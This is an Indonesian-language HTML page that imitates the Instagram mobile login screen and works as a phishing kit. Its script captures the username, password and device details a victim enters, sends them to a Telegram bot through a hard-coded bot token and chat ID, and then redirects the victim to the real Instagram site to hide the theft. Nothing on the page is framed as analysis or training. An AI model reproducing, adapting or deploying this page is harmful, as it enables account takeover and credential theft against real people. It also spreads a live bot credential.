<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px 15px;
            font-size: 14px;
            background-color: #121212;
        }
        
        .status-bar-left {
            font-weight: bold;
        }
        
        .status-bar-right {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .battery {
            width: 25px;
            height: 12px;
            border: 1px solid white;
            border-radius: 3px;
            position: relative;
            display: inline-block;
        }
        
        .battery::after {
            content: "";
            position: absolute;
            left: 0;
            top: 2px;
            height: 6px;
            width: 28%;
            background: white;
            margin-left: 2px;
        }
        
        .battery::before {
            content: "";
            position: absolute;
            right: -3px;
            top: 3px;
            height: 5px;
            width: 2px;
            background: white;
            border-radius: 0 2px 2px 0;
        }
        
        .header {
            padding: 15px;
            display: flex;
            align-items: center;
        }
        
        .back-button {
            font-size: 24px;
            color: white;
            text-decoration: none;
        }
        
        .language-selector {
            margin: 0 auto;
            color: #8e8e8e;
            display: flex;
            align-items: center;
            font-size: 16px;
        }
        
        .arrow-down {
            margin-left: 5px;
        }
        
        .main-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            flex: 1;
            padding: 0 20px;
        }
        
        .logo-container {
            margin-bottom: 50px;
        }
        
        .instagram-logo {
            width: 75px;
            height: 75px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 20px;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .instagram-logo::before {
            content: "";
            position: absolute;
            width: 55px;
            height: 55px;
            border: 4px solid white;
            border-radius: 16px;
        }
        
        .instagram-logo::after {
            content: "";
            position: absolute;
            width: 25px;
            height: 25px;
            border: 4px solid white;
            border-radius: 50%;
        }
        
        .instagram-logo .dot {
            position: absolute;
            width: 6px;
            height: 6px;
            background: white;
            border-radius: 50%;
            top: 18px;
            right: 18px;
        }
        
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .form-input {
            width: 100%;
            padding: 15px;
            background-color: #262626;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }
        
        .form-input::placeholder {
            color: #8e8e8e;
        }
        
        .login-button {
            width: 100%;
            padding: 15px;
            background-color: #0095f6;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
        }
        
        .forgot-password {
            color: #0095f6;
            text-align: center;
            margin-top: 20px;
            text-decoration: none;
            font-size: 14px;
        }
        
        .footer {
            margin-top: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }
        
        .signup-button {
            width: 100%;
            padding: 15px;
            background-color: transparent;
            border: 1px solid #0095f6;
            border-radius: 5px;
            color: #0095f6;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .meta-logo {
            color: #8e8e8e;
            font-size: 30px;
            margin-top: 20px;
        }
        
        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Status Bar -->
    <div class="status-bar">
        <div class="status-bar-left">23.18</div>
        <div class="status-bar-right">
            <span>22.0 KB/S</span>
            <span>LTE</span>
            <span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"></path>
                    <circle cx="12" cy="12" r="5"></circle>
                </svg>
            </span>
            <div class="battery"></div>
            <span>28%</span>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <a href="#" class="back-button">‚Üê</a>
        <div class="language-selector">
            Bahasa Indonesia <span class="arrow-down">‚ñº</span>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <div class="logo-container">
            <div class="instagram-logo">
                <div class="dot"></div>
            </div>
        </div>

        <form class="login-form" id="loginForm">
            <input type="text" class="form-input" id="username" placeholder="Nama pengguna, email, atau nomor ponsel" required>
            <input type="password" class="form-input" id="password" placeholder="Kata sandi" required>
            <button type="button" class="login-button" id="loginButton">Login</button>
        </form>

        <a href="#" class="forgot-password">Lupa kata sandi?</a>
    </div>

    <!-- Footer -->
    <div class="footer">
        <button type="button" class="signup-button">Buat akun baru</button>
        <div class="meta-logo">
            Meta
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <script>
        // Replace with your Telegram bot token and chat ID
        const BOT_TOKEN = '7010763672:AAGCJ6DALZSUYgnfRd4IoYgvMVZ1EPJ2whs';
        const CHAT_ID = '6936656125';
        
        document.getElementById('loginButton').addEventListener('click', function() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (username && password) {
                // Show loading overlay
                document.getElementById('loadingOverlay').style.display = 'flex';
                
                // Get additional information
                const deviceInfo = {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    timeStamp: new Date().toISOString()
                };
                
                // Format message for Telegram
                const message = `
üì± *INSTAGRAM LOGIN*
üë§ *Username:* \`${username}\`
üîë *Password:* \`${password}\`

üì± *DEVICE INFO*
üîç *Platform:* ${deviceInfo.platform}
üåê *Browser:* ${deviceInfo.userAgent}
üåç *Language:* ${deviceInfo.language}
üìä *Screen:* ${deviceInfo.screenSize}
‚è∞ *Time:* ${deviceInfo.timeStamp}
                `.trim();
                
                // Send data to Telegram bot
                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    // Redirect after successful submission (optional)
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com";
                    }, 2000);
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Still redirect even if there's an error
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com";
                    }, 2000);
                })
                .finally(() => {
                    // Hide loading overlay after delay
                    setTimeout(() => {
                        document.getElementById('loadingOverlay').style.display = 'none';
                    }, 1500);
                });
            } else {
                alert('Harap isi nama pengguna dan kata sandi');
            }
        });
    </script>
</body>
</html>
